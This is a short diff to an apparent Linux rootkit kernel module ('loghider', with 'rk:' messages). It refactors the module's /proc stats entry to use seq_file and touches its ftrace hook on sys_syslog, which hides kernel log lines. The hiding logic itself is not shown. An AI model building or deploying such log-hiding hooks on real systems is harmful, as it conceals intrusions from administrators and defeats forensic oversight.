@@ -6,6 +6,7 @@
 #include <linux/module.h>
 #include <linux/printk.h>
 #include <linux/proc_fs.h>
+#include <linux/seq_file.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
 
@@ -139,20 +140,11 @@ static void remove_hook(void)
 	ftrace_set_filter_ip(&syslog_ops, sys_syslog_addr, 1, 0);
 }
 
-static ssize_t stats_show(struct file *f, char __user *buf,
-			  size_t count, loff_t *pos)
+static int stats_show(struct seq_file *m, void *v)
 {
-	char tmp[64];
-	int len;
-
-	len = snprintf(tmp, sizeof(tmp), "hidden=%d\n",
-		       atomic_read(&hidden_count));
-	return simple_read_from_buffer(buf, count, pos, tmp, len);
+	seq_printf(m, "hidden=%d\n", atomic_read(&hidden_count));
+	return 0;
 }
-
-static const struct proc_ops stats_ops = {
-	.proc_read = stats_show,
-};
 
 static int __init loghider_init(void)
 {
@@ -167,7 +159,7 @@ static int __init loghider_init(void)
 	pr_info("rk: log hiding active\n");
 	pr_info("rk: this line should be hidden from dmesg\n");
 
-	proc_entry = proc_create("rk_logfilter", 0444, NULL, &stats_ops);
+	proc_entry = proc_create_single("rk_logfilter", 0444, NULL, stats_show);
 	if (!proc_entry) {
 		remove_hook();
 		return -ENOMEM;
